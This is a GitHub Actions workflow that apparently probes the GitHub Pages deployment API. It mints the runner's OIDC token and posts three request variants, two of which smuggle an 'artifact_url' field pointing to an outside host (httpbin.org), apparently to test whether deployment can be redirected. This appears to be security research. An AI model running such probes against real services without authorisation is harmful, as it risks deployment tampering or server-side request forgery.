name: bf45-auth-test
on:
  workflow_dispatch:
permissions: { contents: read, pages: write, id-token: write }
jobs:
  test:
    runs-on: ubuntu-latest
    environment: { name: github-pages }
    steps:
      - run: mkdir -p _site && echo '<html>test</html>' > _site/index.html
      - uses: actions/upload-pages-artifact@v3
        with: { path: _site }
      - name: test-payload-variants
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
          echo "::add-mask::$OIDC"
          API="https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments"
          ART=$(curl -s -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID/artifacts" | jq -r '.artifacts[0].id')
          echo "ART=$ART"
          
          echo "===== T1: minimal (no artifact_url, no environment) ====="
          curl -s -w '\nHTTP=%{http_code}\n' -X POST "$API" \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            -H "Content-Type: application/json; charset=utf-8" \
            -H "User-Agent: octokit-core.js/5.0.0 Node.js/20.0.0" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            -d "{\"artifact_id\":$ART,\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$OIDC\"}"
          
          sleep 3
          
          echo "===== T2: with artifact_url added ====="
          curl -s -w '\nHTTP=%{http_code}\n' -X POST "$API" \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            -H "Content-Type: application/json; charset=utf-8" \
            -H "User-Agent: octokit-core.js/5.0.0 Node.js/20.0.0" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            -d "{\"artifact_id\":$ART,\"artifact_url\":\"https://httpbin.org/get\",\"pages_build_version\":\"${GITHUB_SHA}-t2\",\"oidc_token\":\"$OIDC\"}"
          
          sleep 3
          
          echo "===== T3: with environment field ====="
          curl -s -w '\nHTTP=%{http_code}\n' -X POST "$API" \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            -H "Content-Type: application/json; charset=utf-8" \
            -H "User-Agent: octokit-core.js/5.0.0 Node.js/20.0.0" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            -d "{\"artifact_id\":$ART,\"artifact_url\":\"https://httpbin.org/get\",\"pages_build_version\":\"${GITHUB_SHA}-t3\",\"oidc_token\":\"$OIDC\",\"environment\":\"github-pages\"}"
